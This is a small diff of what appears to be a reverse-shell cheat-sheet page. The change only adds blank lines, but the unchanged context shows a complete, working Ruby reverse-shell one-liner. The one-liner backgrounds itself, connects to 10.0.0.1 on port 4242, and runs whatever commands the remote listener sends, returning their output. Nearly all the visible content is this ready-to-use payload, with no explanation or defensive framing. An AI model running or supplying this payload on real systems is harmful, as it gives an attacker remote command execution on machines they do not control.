@@ -16,3 +16,5 @@ updated_at: '2023-04-10T20:25:24.555565+00:00'
 ```bash
 ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.0.0.1","4242");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
 ```
+
+
